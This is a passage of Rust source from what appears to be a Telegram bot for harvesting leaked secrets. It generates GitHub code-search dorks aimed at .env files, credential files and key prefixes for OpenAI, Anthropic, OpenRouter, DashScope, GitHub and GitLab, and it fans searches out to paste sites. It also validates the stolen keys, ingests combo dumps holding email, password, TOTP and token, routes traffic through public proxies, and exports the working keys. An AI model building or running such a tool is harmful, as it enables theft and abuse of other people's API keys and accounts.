    let selected: Vec<Finding> = if preset == ExportPreset::Custom {
        let Some(needle) = filter
            .as_deref()
            .map(str::trim)
            .filter(|s| !s.is_empty())
            .map(str::to_lowercase)
        else {
            return Ok(());
        };
        select_custom(app, chat, findings, needle).await
    } else {
        findings
            .into_iter()
            .filter(|f| export_matches(f, preset, None))
            .collect()
    };
    if selected.is_empty() {
        let _ = app
            .tg
            .send(
                chat,
                &format!(
                    "📤 В базе нет VALID-ключей под фильтр <b>{}</b>.",
                    esc(filter.as_deref().unwrap_or(preset.label()))
                ),
                None,
            )
            .await;
        return Ok(());
    }

    let rows: Vec<(String, String)> = selected
        .iter()
        .map(|f| (f.key.clone(), f.endpoint.clone()))
        .collect();
    let dir = std::path::Path::new("exports");
    std::fs::create_dir_all(dir)?;
    let stamp = chrono::Utc::now().timestamp_millis();
    let path = dir.join(format!("valid_{}_{}.txt", preset.slug(), stamp));
    std::fs::write(&path, crate::format::valid_txt(&rows))?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let _ = std::fs::set_permissions(dir, std::fs::Permissions::from_mode(0o700));
        let _ = std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o600));
    }

    let mut caption = format!(
        "{} · <b>{}</b>\nСрез: <b>{}</b>\nФормат: ключ → endpoint",
        "📤 <b>VALID keys</b>",
        rows.len(),
        esc(preset.label())
    );
    if let Some(filter) = filter.as_deref().filter(|s| !s.trim().is_empty()) {
        caption.push_str(&format!("\nФильтр: <code>{}</code>", esc(filter)));
    }
    if let Err(e) = app.tg.send_document(chat, &path, &caption).await {
        let _ = app
            .tg
            .send(chat, &format!("❌ Экспорт: {}", esc(&e.to_string())), None)
            .await;
    }
    Ok(())
}

async fn handle_proxies(app: &Arc<App>, chat: i64, args: &str) -> Result<()> {
    match args.trim() {
        "on" | "вкл" => {
            app.store.set_setting("auto_proxy", "1")?;
            send_panel(app, chat, proxy_panel(app)).await?;
        }
        "off" | "выкл" => {
            app.store.set_setting("auto_proxy", "0")?;
            if app.store.setting("proxy", "").trim().is_empty() {
                let _ = app.set_scoped_proxy(None, "probe");
            }
            send_panel(app, chat, proxy_panel(app)).await?;
        }
        "scope" => {
            let cur = app.store.setting("proxy_scope", "sources");
            let next = match cur.as_str() {
                "sources" => "probe",
                "probe" => "all",
                _ => "sources",
            };
            app.store.set_setting("proxy_scope", next)?;
            send_panel(app, chat, proxy_panel(app)).await?;
        }
        "now" => {
            let p = app.proxy_pool.clone();
            tokio::spawn(async move {
                if let Err(e) = p.refresh().await {
                    warn!("proxy refresh: {e}");
                }
            });
            let _ = app
                .tg
                .send(
                    chat,
                    "🔄 Проверяю публичные прокси в фоне — 30–90 секунд.",
                    None,
                )
                .await;
        }
        "" => send_panel(app, chat, proxy_panel(app)).await?,
        _ => {
            let _ = app
                .tg
                .send(
                    chat,
                    "🌐 <code>/proxies</code> · <code>/proxies on|off</code> · <code>/proxies now</code> · <code>/proxies scope</code>",
                    None,
                )
                .await;
        }
    }
    Ok(())
}

async fn handle_sources(app: &Arc<App>, chat: i64, args: &str) -> Result<()> {
    match args.trim() {
        "on" | "вкл" => {
            app.store.set_setting("sources", "1")?;
            app.store.set_setting("last_source", "0")?;
            send_panel(app, chat, sources_panel(app)).await?;
        }
        "off" | "выкл" => {
            app.store.set_setting("sources", "0")?;
            send_panel(app, chat, sources_panel(app)).await?;
        }
        "now" => match crate::auto::trigger_sources_now(app).await {
            Some(q) => {
                let _ = app
                    .tg
                    .send(
                        chat,
                        &format!(
                            "🌐 <b>Источник запущен:</b> <code>{}</code>\nКарточки придут сюда.",
                            esc(&q)
                        ),
                        None,
                    )
                    .await;
            }
            None => {
                let _ = app
                    .tg
                    .send(
                        chat,
                        "⏳ Нет свободного воркера — попробуй через минуту.",
                        None,
                    )
                    .await;
            }
        },
        "" => send_panel(app, chat, sources_panel(app)).await?,
        _ => {
            let _ = app
                .tg
                .send(
                    chat,
                    "🌐 <code>/sources</code> · <code>/sources on|off</code> · <code>/sources now</code>",
                    None,
                )
                .await;
        }
    }
    Ok(())
}

async fn handle_auto(app: &Arc<App>, chat: i64, args: &str) -> Result<()> {
    let args = args.trim();
    match args {
        "on" | "1" | "вкл" => {
            app.store.set_setting("auto", "1")?;
            app.store.set_setting("last_auto", "0")?;
            let _ = app
                .tg
                .send(
                    chat,
                    &format!(
                        "📡 <b>Автоскан включён</b>\n\n⏱ Интервал: <b>{}</b>\n🎚 Батч: <b>{}</b>\n🎯 Запросов в пуле: <b>{}</b>",
                        interval_label(app.store.setting_i64("auto_interval", 25)),
                        app.store.setting_i64("auto_batch", 6),
                        app.store.list_queries().len()
                    ),
                    None,
                )
                .await;
        }
        "off" | "0" | "выкл" => {
            app.store.set_setting("auto", "0")?;
            let _ = app
                .tg
                .send(chat, "📡 <b>Автоскан выключен.</b>", None)
                .await;
        }
        "now" => {
            if app.pool.alive() == 0 {
                let _ = app
                    .tg
                    .send(chat, "⚠️ Нет живых PAT — автоскану нечем искать.", None)
                    .await;
                return Ok(());
            }
            let n = crate::auto::trigger_now(app).await;
            let _ = app
                .tg
                .send(
                    chat,
                    &format!(
                        "🚀 <b>Авто-импульс</b>: запущено <b>{}</b> сканов.\nКарточки придут сюда.",
                        n
                    ),
                    None,
                )
                .await;
        }
        _ => {
            let on = app.store.setting_i64("auto", 1) == 1;
            let active = app.active_jobs.load(std::sync::atomic::Ordering::Relaxed);
            let workers = app.store.setting_i64("workers", 24);
            let last = app.store.setting_i64("last_auto", 0);
            let _ = app
                .tg
                .send(
                    chat,
                    &format!(
                        "📡 <b>АВТОСКАН</b> · {}\n\n⏱ Интервал: <b>{}</b>\n🎚 Батч: <b>{}</b>\n⚙️ В работе: <b>{}/{}</b>\n🎯 Запросов: <b>{}</b>\n🗺 Хостов: <b>{}</b>\n🕐 Последний: <b>{}</b>",
                        if on { "вкл" } else { "выкл" },
                        interval_label(app.store.setting_i64("auto_interval", 25)),
                        app.store.setting_i64("auto_batch", 6),
                        active,
                        workers,
                        app.store.list_queries().len(),
                        app.store.hosts_count(),
                        if last > 0 { msk(last) } else { "—".to_string() }
                    ),
                    Some(kb(vec![
                        vec![
                            ("▶️ Включить", "a:on"),
                            ("⏹ Выключить", "a:off"),
                        ],
                        vec![("← Назад", "m:main")],
                    ])),
                )
                .await;
        }
    }
    Ok(())
}

async fn add_pats(app: Arc<App>, chat: i64, raw: String) {
    let parsed = crate::pat::parse_input(&raw);
    let tokens = parsed.entries;
    // combo-дампы (email:pass:totp:recovery:user:token) — аккаунты учитываем отдельно
    let mut accounts = 0usize;
    for combo in &parsed.combos {
        if let Ok(true) = app.store.add_gh_account(combo) {
            accounts += 1;
        }
    }
    if tokens.is_empty() {
        let hint = if parsed.skipped.is_empty() {
            "".to_string()
        } else {
            format!(
                "\n\n⚠️ Не распознано: <code>{}</code>",
                esc(&parsed.skipped.join(" "))
            )
        };
        let _ = app
            .tg
            .send(
                chat,
                &format!(
                    "❌ Не вижу ни одного PAT.\n\nФорматы: <code>ghp_…</code>, <code>github_pat_…</code>, <code>glpat-…</code>, <code>gitee:ТОКЕН</code>, <code>gitlab:glpat-…</code>, <code>gitea:ТОКЕН</code>, <code>codeberg:ТОКЕН</code>.{hint}"
                ),
                None,
            )
            .await;
        return;
    }
    let total = tokens.len();
    let mut lines: Vec<String> = Vec::new();
    let mut ok = 0usize;
    for (provider, token) in tokens.iter().take(200) {
        let chk = if provider.eq_ignore_ascii_case("github") {
            app.gh.validate(token).await
        } else {
            crate::pat::validate(&app.prober.http_client(), provider, token).await
        };
        if chk.ok {
            let kind = crate::pat::kind(provider, token);
            match app.store.add_pat_provider(
                provider,
                token,
                &chk.login,
                &chk.scopes,
                &kind,
                "alive",
            ) {
                Ok(_) => {
                    ok += 1;
                    lines.push(format!(
                        "✅ <code>{}</code> · <b>{}</b> · {} · 🔎 {}",
                        mask(token),
                        esc(&chk.login),
                        crate::pat::label(provider),
                        chk.search
                    ));
                }
                Err(e) => lines.push(format!(
                    "⚠️ <code>{}</code> · {}",
                    mask(token),
                    esc(&e.to_string())
                )),
            }
        } else {
            lines.push(format!(
                "❌ <code>{}</code> · {} · {}",
                mask(token),
                crate::pat::label(provider),
                esc(&chk.error)
            ));
        }
        tokio::time::sleep(Duration::from_millis(220)).await;
    }
    let _ = app.pool.reload();
    app.sync_source_pats();
    let mut text = format!(
        "🗂 <b>PAT загружены</b>\n\n✅ принято: <b>{}</b> из {}\n👤 combo-аккаунтов: <b>{}</b>\n\n",
        ok, total, accounts
    );
    for line in lines.iter().take(30) {
        text.push_str(line);
        text.push('\n');
    }
    if lines.len() > 30 {
        text.push_str(&format!("… и ещё {}\n", lines.len() - 30));
    }
    if ok > 0 {
        text.push_str("\n🚀 Пул обновлён. Можно запускать /scan.");
    }
    let _ = app.tg.send(chat, &text, None).await;
}

async fn test_pats(app: Arc<App>, chat: i64) {
    let pats = app.store.list_pats();
    if pats.is_empty() {
        let _ = app.tg.send(chat, "🗂 Пул пуст.", None).await;
        return;
    }
    let mut ok = 0usize;
    let mut dead = 0usize;
    for p in pats.iter().take(60) {
        let chk = if p.provider.eq_ignore_ascii_case("github") {
            app.gh.validate(&p.token).await
        } else {
            crate::pat::validate(&app.prober.http_client(), &p.provider, &p.token).await
        };
        if chk.ok {
            app.store.mark_pat(p.id, "alive");
            ok += 1;
        } else if chk.error.contains("401") || chk.error.contains("403") {
            app.store.mark_pat(p.id, "dead");
            dead += 1;
        }
        tokio::time::sleep(Duration::from_millis(200)).await;
    }
    let _ = app.pool.reload();
    app.sync_source_pats();
    let _ = app
        .tg
        .send(
            chat,
            &format!(
                "🧪 <b>Проверка пула</b>\n\n✅ живых: <b>{}</b>\n💀 мёртвых: <b>{}</b>",
                ok, dead
            ),
            Some(kb(vec![vec![("🗂 К пулу", "m:pats")]])),
        )
        .await;
}

fn split_cmd(text: &str) -> (String, String) {
    let t = text.trim_start_matches('/');
    let idx = t.find(char::is_whitespace).unwrap_or(t.len());
    let head = &t[..idx];
    let args = t[idx..].trim();
    (
        head.split('@').next().unwrap_or(head).to_lowercase(),
        args.to_string(),
    )
}

fn looks_repo(s: &str) -> bool {
    let s = s.strip_suffix(".git").unwrap_or(s);
    let parts: Vec<&str> = s.split('/').collect();
    parts.len() == 2
        && parts.iter().all(|p| {
            !p.is_empty()
                && p.len() < 80
                && p.chars()
                    .all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-' || c == '.')
        })
}

async fn start_scan(app: &Arc<App>, chat: i64, raw: &str) -> Result<()> {
    let query = raw.trim();
    let (query, forced) = if let Some(rest) = query.strip_prefix("repo:") {
        (rest.trim(), Some(JobKind::Repo))
    } else {
        (query, None)
    };
    if query.is_empty() {
        let _ = app.tg.send(chat, "❌ Пустая цель.", None).await;
        return Ok(());
    }
    let kind = forced.unwrap_or_else(|| {
        if looks_repo(query) {
            JobKind::Repo
        } else {
            JobKind::Search
        }
    });
    start_scan_kind(app, chat, query, kind).await
}

async fn start_scan_kind(app: &Arc<App>, chat: i64, query: &str, kind: JobKind) -> Result<()> {
    let pool_ok = app.pool.alive() > 0;
    let mut github_ids: Vec<i64> = Vec::new();
    let mut source_ids: Vec<i64> = Vec::new();
    let source_limit = app
        .store
        .setting_i64("manual_sources_limit", 100)
        .clamp(0, 120) as usize;

    // GitHub code search/repo scan still needs a PAT; a manual search should
    // nevertheless fan out to the web sources when the PAT pool is empty.
    if pool_ok {
        let queries = if kind == JobKind::Search {
            let offset = app.store.setting_i64("manual_dork_cursor", 0).max(0) as usize;
            manual_queries_from(
                query,
                app.store.setting_i64("manual_dorks", 20).clamp(1, 120) as usize,
                offset,
            )
        } else {
            vec![query.to_string()]
        };
        for (index, q) in queries.into_iter().enumerate() {
            let id = app.store.job_start(kind.as_str(), &q)?;
            let lane = if kind == JobKind::Search && crate::github::query_is_official(&q) {
                crate::github::SearchLane::Official
            } else {
                crate::github::SearchLane::Pair
            };
            let job = Job {
                id,
                chat_id: chat,
                kind,
                query: q,
                // The overall manual summary already lists every job. Only
                // the first job gets the verbose status thread; the rest run
                // quiet so 80 dorks do not turn into 80 Telegram edits.
                quiet: index > 0,
                manual: true,
                lane,
            };
            if app.scan_tx.try_send(job).is_ok() {
                github_ids.push(id);
            } else {
                app.store.job_finish(id, "error", 0, 0, "queue full");
            }
        }
        let next_dork = app.store.setting_i64("manual_dork_cursor", 0) + 1;
        app.store
            .set_setting("manual_dork_cursor", &next_dork.to_string())
            .ok();
    }

    // A manual code-search dork is also a useful query for the external
    // source adapters. Strip GitHub-only qualifiers and rotate a few plain
    // query variants, so consecutive runs do not hammer the same sources with
    // byte-identical searches.
    if matches!(kind, JobKind::Search | JobKind::Repo) && source_limit > 0 {
        let source_queries = manual_source_queries(query);
        let source_cursor = app.store.setting_i64("manual_source_cursor", 0).max(0) as usize;
        for (i, source) in manual_source_names_for(query, source_limit)
            .into_iter()
            .enumerate()
        {
            let sq = &source_queries[(i + source_cursor) % source_queries.len()];
            let raw = format!("{}|{}", source, sq);
            let id = app.store.job_start(JobKind::Source.as_str(), &raw)?;
            let job = Job {
                id,
                chat_id: chat,
                kind: JobKind::Source,
                query: raw.clone(),
                quiet: true,
                manual: true,
                lane: crate::github::SearchLane::Pair,
            };
            if app.scan_tx.try_send(job).is_ok() {
                source_ids.push(id);
            } else {
                warn!("manual source queue full: {}", raw);
                app.store.job_finish(id, "error", 0, 0, "queue full");
            }
        }
        app.store
            .set_setting(
                "manual_source_cursor",
                &((source_cursor + 1) % source_queries.len()).to_string(),
            )
            .ok();
    }

    info!(
        "manual: queued {} GitHub dorks and {} source jobs",
        github_ids.len(),
        source_ids.len()
    );
    if github_ids.is_empty() && source_ids.is_empty() {
        let _ = app
            .tg
            .send(
                chat,
                "⚠️ Нет живых PAT и не удалось поставить источники. Заливай: /addpat",
                None,
            )
            .await;
        return Ok(());
    }

    let mut what = String::new();
    if !github_ids.is_empty() {
        what.push_str(&format!("GitHub: <b>{}</b> дорков", github_ids.len()));
        let preview = github_ids
            .iter()
            .take(5)
            .map(|id| format!("#{id}"))
            .collect::<Vec<_>>()
            .join(", ");
        what.push_str(&format!(
            " ({preview}{})",
            if github_ids.len() > 5 { "…" } else { "" }
        ));
    }
    if !source_ids.is_empty() {
        if !what.is_empty() {
            what.push_str(" + ");
        }
        what.push_str(&format!("источники <b>{}</b>", source_ids.len()));
    }
    // Progress is for the GitHub dork plan (the 80-query budget). Source
    // fan-out runs independently and is shown in the header, not counted
    // here; otherwise a fast source job can finish before the batch is
    // registered and make the counter look stuck.
    let all_ids = github_ids.clone();
    let batch = Arc::new(crate::app::ManualBatch::new(
        chat,
        query.to_string(),
        &all_ids,
    ));
    {
        let mut batches = app.manual_batches.lock().unwrap_or_else(|e| e.into_inner());
        batches.insert(chat, batch.clone());
    }
    let mid = app
        .tg
        .send(
            chat,
            &format!(
                "🚀 <b>Ручной скан</b> · {}\n<code>{}</code>\n\n📊 Прогресс: <b>0/{}</b>",
                what,
                esc(query),
                batch.total
            ),
            None,
        )
        .await
        .unwrap_or(0);
    batch.message_id.store(mid, Ordering::Relaxed);
    if !pool_ok {
        let _ = app
            .tg
            .send(
                chat,
                "ℹ️ PAT-пул пуст: GitHub-часть пропущена, источники работают.",
                None,
            )
            .await;
    }
    Ok(())
}

/// Manual scans get the same breadth as the autonomous scanner and then some:
/// the target itself plus high-yield qualifiers/provider pivots. Auto jobs
/// stay single-dork to keep quota predictable.
fn manual_queries(raw: &str, dork_limit: usize) -> Vec<String> {
    manual_queries_from(raw, dork_limit, 0)
}

/// Build a wide manual dork set, then rotate the optional tail so two manual
/// runs with the same target do not re-read the same first page forever.
fn manual_queries_from(raw: &str, dork_limit: usize, offset: usize) -> Vec<String> {
    let q = raw.trim().to_string();
    if q.is_empty() || q.contains("://") || looks_repo(&q) {
        return vec![q];
    }
    let low = q.to_ascii_lowercase();
    let mut out = vec![q.clone()];
    // Provider registry expansion: one place for hosts, env variable names,
    // key prefixes and localized aliases across 30+ AI providers.
    out.extend(crate::searchplan::provider_dorks(&q));
    let has_ext = low.contains("extension:") || low.contains("filename:");
    let has_scope = low.contains("in:file") || low.contains("path:") || low.contains("repo:");

    // Provider pivots go first: they are the highest-yield new-result dorks.
    let providers: &[(&str, &str, &str)] = &[
        ("openrouter", "openrouter.ai", "OPENROUTER_API_KEY"),
        ("openai", "api.openai.com", "OPENAI_API_KEY"),
        ("deepseek", "api.deepseek.com", "DEEPSEEK_API_KEY"),
        ("dashscope", "dashscope.aliyuncs.com", "DASHSCOPE_API_KEY"),
        ("qwen", "dashscope.aliyuncs.com", "DASHSCOPE_API_KEY"),
        ("bailian", "dashscope.aliyuncs.com", "DASHSCOPE_API_KEY"),
        ("anthropic", "api.anthropic.com", "ANTHROPIC_API_KEY"),
        ("moonshot", "api.moonshot.ai", "MOONSHOT_API_KEY"),
        ("xai", "api.x.ai", "XAI_API_KEY"),
        (
            "modelscope",
            "api-inference.modelscope.cn",
            "MODELSCOPE_API_KEY",
        ),
        ("seedance", "ark.cn-beijing.volces.com", "SEEDANCE_API_KEY"),
        ("seedance", "ark.cn-beijing.volces.com", "ARK_API_KEY"),
    ];
    let matched: Vec<&(&str, &str, &str)> = providers
        .iter()
        .filter(|(name, host, var)| {
            low.contains(name) || low.contains(host) || low.contains(&var.to_ascii_lowercase())
        })
        .collect();
    let priority = ["openrouter", "openai", "deepseek", "dashscope"];
    let generic = matches!(
        low.trim_matches('"').trim(),
        "api_key" | "apikey" | "api key" | "sk-" | "token" | "secret" | "key"
    );
    let pivots: Vec<&(&str, &str, &str)> = if !matched.is_empty() {
        matched
    } else if generic {
        // Only a truly generic key target fans out to the priority providers.
        // A named target such as `modelscope` must never receive unrelated
        // OpenRouter/DeepSeek dorks.
        providers
            .iter()
            .filter(|(name, _, _)| priority.contains(name))
            .collect()
    } else {
        Vec::new()
    };
    let pivot_count = pivots.len();
    let provider_names: Vec<&str> = pivots.iter().map(|(name, _, _)| *name).collect();
    for (_, host, var) in pivots {
        if host.contains("volces.com") {
            // Volcengine Ark keys are usually UUID-like, not `sk-…`.
            out.push(format!("\"{host}\" \"SEEDANCE_API_KEY\" in:file"));
            out.push(format!("\"doubao-seedance\" \"{var}\" in:file"));
        } else {
            out.push(format!("\"{host}\" \"sk-\" in:file"));
        }
        out.push(format!("\"{var}\" path:.env"));
        out.push(format!("\"{var}\" path:.env"));
    }

    if low.contains("modelscope") {
        out.push("\"api-inference.modelscope.cn\" \"ms-\" in:file".into());
        out.push("\"modelscope.cn\" \"ms-\" in:file".into());
        out.push("\"MODELSCOPE_API_KEY\" path:.env".into());
    }

    if !has_ext {
        out.push(format!("{q} path:.env"));
        out.push(format!("{q} path:.env"));
    }
    if !has_scope {
        out.push(format!("{q} in:file"));
    }

    // Fresh code first: old leaked keys are mostly revoked.
    if !low.contains("pushed:") {
        let cutoff = (chrono::Utc::now() - chrono::Duration::days(90))
            .format("%Y-%m-%d")
            .to_string();
        out.push(format!("{q} pushed:>{cutoff}"));
        out.push(format!("{q} pushed:>{cutoff} path:.env"));
    }

    // Literal key-shape dorks are provider-scoped. A DashScope target must
    // never spawn `ghp_`/OpenRouter dorks merely because the scanner knows
    // those shapes; PAT shapes are added only for a PAT/git target.
    let wants_pat = low.contains("ghp_")
        || low.contains("github_pat")
        || low.contains("github_token")
        || low.contains("gh_token")
        || low.contains("gh_pat")
        || low.contains("x-access-token")
        || low.contains("github");
    let wants_gitlab = low.contains("glpat")
        || low.contains("gitlab")
        || low.contains("gitee_")
        || low.contains("gitea_");
    let wants_gitee = low.contains("gitee");
    let mut shapes: Vec<String> = Vec::new();
    if generic {
        // A genuine generic target is the only case that fans out across
        // non-PAT provider shapes.
        shapes.extend(
            [
                "\"sk-proj-\" path:.env",
                "\"sk-or-v1-\" path:.env",
                "\"sk-ant-\" path:.env",
                "\"xai-\" path:.env",
                "\"ms-\" path:.env",
            ]
            .into_iter()
            .map(str::to_string),
        );
    } else {
        for name in &provider_names {
            match *name {
                "openai" => shapes.push("\"sk-proj-\" path:.env".into()),
                "openrouter" => shapes.push("\"sk-or-v1-\" path:.env".into()),
                "anthropic" => shapes.push("\"sk-ant-\" path:.env".into()),
                "xai" => shapes.push("\"xai-\" path:.env".into()),
                "dashscope" | "qwen" | "bailian" => {
                    shapes.push("\"DASHSCOPE_API_KEY\" path:.env".into());
                }
                "modelscope" => shapes.push("\"ms-\" path:.env".into()),
                "seedance" => {
                    shapes.push("\"SEEDANCE_API_KEY\" path:.env".into());
                    shapes.push("\"ARK_API_KEY\" path:.env".into());
                }
                _ => {}
            }
        }
    }
    if wants_pat {
        shapes.push("\"ghp_\" path:.env".into());
        shapes.push("\"github_pat_\" path:.env".into());
    }
    if wants_gitlab {
        shapes.push("\"glpat-\" path:.env".into());
    }
    if wants_gitee {
        shapes.push("\"gitee_\" path:.env".into());
    }
    for shape in shapes {
        out.push(shape);
    }

    if !has_ext {
        for suffix in [
            "extension:yaml",
            "extension:yml",
            "extension:json",
            "extension:toml",
            "extension:properties",
            "filename:docker-compose.yml",
            "filename:docker-compose.yaml",
            "filename:Dockerfile",
            "filename:Jenkinsfile",
            "filename:.gitlab-ci.yml",
            "filename:terraform.tfvars",
            "filename:values.yaml",
            "path:.github/workflows",
            "path:config",
        ] {
            out.push(format!("{q} {suffix}"));
        }
    }
    if !has_scope {
        // GitHub Code Search rejects several legacy qualifier combinations
        // with HTTP 422. `path:` is the supported, targeted alternative.
        out.push(format!("{q} path:.env"));
        out.push(format!("{q} path:config"));
    }
    // File/path/language pack. This runs even when the target already has an
    // extension qualifier, so an 80-dork manual budget is actually filled
    // instead of silently collapsing to a handful of queries.
    for suffix in [
        "path:.github/workflows",
        "path:.config",
        "path:deploy",
        "path:infra",
        "path:scripts",
        "path:docker",
        "path:helm",
        "path:k8s",
        "path:kubernetes",
        "path:ansible",
        "path:examples",
        "path:.env.local",
        "path:.env.production",
        "path:.env.development",
        "path:.env.staging",
        "filename:secrets.yaml",
        "filename:secrets.yml",
        "filename:credentials",
        "filename:application.properties",
        "filename:appsettings.json",
        "filename:config.json",
        "filename:config.yaml",
        "filename:docker-compose.yml",
        "filename:docker-compose.yaml",
        "filename:Dockerfile",
        "filename:Jenkinsfile",
        "filename:.gitlab-ci.yml",
        "filename:terraform.tfvars",
        "filename:values.yaml",
        "language:python",
        "language:typescript",
        "language:javascript",
        "language:go",
        "language:rust",
        "language:shell",
        "language:yaml",
        "language:json",
    ] {
        if has_ext && suffix.starts_with("extension:") {
            continue;
        }
        out.push(format!("{q} {suffix}"));
    }

    // Context dorks for relay/config projects in Chinese and English.
    for suffix in [
        "\"api_key\"",
        "\"base_url\"",
        "\"baseURL\"",
        "\"Authorization\"",
        "密钥",
        "中转",
        "接口",
        "百炼",
    ] {
        out.push(format!("{q} {suffix}"));
    }

    let mut seen = std::collections::HashSet::new();
    out.retain(|q| seen.insert(q.clone()));
    let base = out.remove(0);
    // Keep the exact target, provider pivots, .env/filename and in:file
    // anchored. Rotation applies only to the optional tail, so a repeated
    // run never loses the high-yield dorks at the front.
    let core =
        (1 + pivot_count * 3 + usize::from(!has_ext) * 2 + usize::from(!has_scope)).min(out.len());
    let mut tail = out.split_off(core);
    if !tail.is_empty() && offset > 0 {
        let len = tail.len();
        tail.rotate_left(offset % len);
    }
    out.extend(tail);
    let n = dork_limit.max(1);
    let mut result = Vec::with_capacity(n.min(out.len() + 1));
    result.push(base);
    result.extend(out.into_iter().take(n.saturating_sub(1)));
    result
}

/// Turn a GitHub code-search dork into a plain query suitable for web/source
/// adapters. Keep quoted tokens, URLs and provider names; drop qualifiers.
fn source_query(raw: &str) -> String {
    let mut out = Vec::new();
    for tok in raw.split_whitespace() {
        let low = tok.to_ascii_lowercase();
        if low == "in:file"
            || low == "in:path"
            || low == "in:readme"
            || low.starts_with("filename:")
            || low.starts_with("path:")
            || low.starts_with("repo:")
            || low.starts_with("org:")
            || low.starts_with("user:")
            || low.starts_with("language:")
            || low.starts_with("pushed:")
            || low.starts_with("sort:")
        {
            continue;
        }
        let clean = tok.trim_matches('"').trim_matches('\'');
        if !clean.is_empty() {
            out.push(clean.to_string());
        }
    }
    if out.is_empty() {
        raw.trim().to_string()
    } else {
        out.join(" ")
    }
}

/// Plain search terms for the web/source adapters. Provider pivots survive
/// `source_query` as standalone terms, giving each source a different query
/// on consecutive manual runs instead of the same five words forever.
fn manual_source_queries(raw: &str) -> Vec<String> {
    let mut out = Vec::new();
    for q in manual_queries(raw, 80) {
        let s = source_query(&q);
        if !s.trim().is_empty() && !out.contains(&s) {
            out.push(s);
        }
    }
    if out.is_empty() {
        out.push(source_query(raw));
    }
    out.truncate(32);
    out
}

fn manual_source_names(limit: usize) -> Vec<String> {
    use std::collections::HashSet;
    let mut seen = HashSet::new();
    let mut rows: Vec<(i64, String)> = Vec::new();
    for (source, _) in crate::sources::tasks() {
        if seen.insert(*source) {
            rows.push((crate::sources::task_priority(source), (*source).to_string()));
        }
    }
    rows.sort_by(|a, b| b.0.cmp(&a.0).then(a.1.cmp(&b.1)));
    rows.into_iter().take(limit).map(|(_, s)| s).collect()
}

/// Global feeds (public gists, pastebin, V2EX, NodeSeek) are PAT-heavy and
/// ignore the target query. A narrow provider target like `DASHSCOPE` must not
/// run them just because the source fan-out is wide; keep them for generic or
/// PAT-oriented targets where they are useful.
fn manual_source_names_for(raw: &str, limit: usize) -> Vec<String> {
    let low = raw.trim().to_ascii_lowercase();
    let broad = matches!(
        low.trim_matches('"').trim(),
        "api_key" | "apikey" | "api key" | "sk-" | "token" | "secret" | "key"
    ) || low.contains("ghp_")
        || low.contains("github_pat")
        || low.contains("github_token")
        || low.contains("gh_token")
        || low.contains("gh_pat")
        || low.contains("gitlab")
        || low.contains("gitee_")
        || low.contains("gitea_");
    manual_source_names(limit)
        .into_iter()
        .filter(|source| {
            broad || !matches!(source.as_str(), "gists" | "pastebin" | "v2ex" | "nodeseek")
        })
        .collect()
}

fn mask(token: &str) -> String {
    let chars: Vec<char> = token.chars().collect();
    if chars.len() <= 14 {
        return format!("{}…", chars.iter().take(6).collect::<String>());
    }
    let head: String = chars.iter().take(10).collect();
    let tail: String = chars.iter().skip(chars.len() - 4).collect();
    format!("{}…{}", head, tail)
}

fn interval_label(seconds: i64) -> String {
    let s = seconds.max(1);
    if s < 60 {
        format!("{s} с")
    } else if s % 60 == 0 {
        format!("{} мин", s / 60)
    } else {
        format!("{} мин {} с", s / 60, s % 60)
    }
}

fn kb(rows: Vec<Vec<(&str, &str)>>) -> Value {
    let rows: Vec<Vec<Value>> = rows
        .into_iter()
        .map(|r| {
            r.into_iter()
                .map(|(t, d)| json!({"text": t, "callback_data": d}))
                .collect()
        })
        .collect();
    json!({"inline_keyboard": rows})
}

fn kb_s(rows: Vec<Vec<(String, String)>>) -> Value {
    let rows: Vec<Vec<Value>> = rows
        .into_iter()
        .map(|r| {
            r.into_iter()
                .map(|(t, d)| json!({"text": t, "callback_data": d}))
                .collect()
        })
        .collect();
    json!({"inline_keyboard": rows})
}

#[cfg(test)]
mod export_tests {
    use super::*;
    use crate::store::ProbeLine;

    fn finding(endpoint: &str, model: &str) -> Finding {
        let mut f = Finding {
            endpoint: endpoint.into(),
            key: "sk-test".into(),
            ..Default::default()
        };
        f.probes.push(ProbeLine {
            model: model.into(),
            code: 200,
            latency_ms: 10,
            note: String::new(),
            rpm: String::new(),
        });
        f
    }

    #[test]
    fn presets_match_official_hosts_only() {
        let openai = finding("https://api.openai.com/v1", "gpt-5");
        let moon = finding("https://api.moonshot.cn/v1", "moonshot-v1-8k");
        let dash = finding(
            "https://dashscope-intl.aliyuncs.com/compatible-mode/v1",
            "qwen-max",
        );
        let workspace = finding(
            "https://ws-bvicalcqq28azivp.cn-beijing.maas.aliyuncs.com/compatible-mode/v1",
            "qwen-max",
        );
        let relay = finding("https://api.relay.test/v1", "gpt-5");
        assert!(export_matches(&openai, ExportPreset::OpenAi, None));
        assert!(!export_matches(&relay, ExportPreset::OpenAi, None));
        assert!(export_matches(&moon, ExportPreset::Moonshot, None));
        assert!(!export_matches(&relay, ExportPreset::Moonshot, None));
        assert!(export_matches(&dash, ExportPreset::DashScope, None));
        assert!(export_matches(&workspace, ExportPreset::DashScope, None));
        assert!(!export_matches(&relay, ExportPreset::DashScope, None));
    }

    #[test]
    fn manual_search_expands_the_target_without_losing_it() {
        let qs = manual_queries(r#""OPENROUTER_API_KEY""#, 8);
        assert!(qs.iter().any(|q| q == r#""OPENROUTER_API_KEY""#));
        assert!(qs.iter().any(|q| q.ends_with(" path:.env")));
        assert!(qs.iter().any(|q| q.ends_with(" path:.env")));
        assert!(qs.iter().any(|q| q.contains("openrouter.ai")));
        assert!(qs.len() <= 8);
        assert_eq!(
            manual_queries("owner/repo", 8),
            vec!["owner/repo".to_string()]
        );
    }

    #[test]
    fn manual_plan_reaches_full_budget() {
        let qs = manual_queries_from("dashscope path:.env", 80, 0);
        assert!(
            qs.len() >= 70,
            "expected an 80-dork manual plan, got {}: {qs:?}",
            qs.len()
        );
        assert!(qs.iter().any(|q| q.contains("DASHSCOPE_API_KEY")));
    }

    #[test]
    fn manual_dorks_are_wide_and_rotate() {
        let first = manual_queries_from(r#""api_key""#, 24, 0);
        let second = manual_queries_from(r#""api_key""#, 24, 1);
        assert!(first.len() >= 20, "expected a wide dork set: {first:?}");
        assert!(first.iter().any(|q| q.contains("openrouter.ai")));
        assert!(first.iter().any(|q| q.contains("DASHSCOPE_API_KEY")));
        assert!(first.iter().any(|q| q.contains("pushed:>")));
        assert_ne!(first, second, "manual runs should rotate their dorks");
        let a = manual_queries_from(r#""OPENROUTER_API_KEY""#, 20, 0);
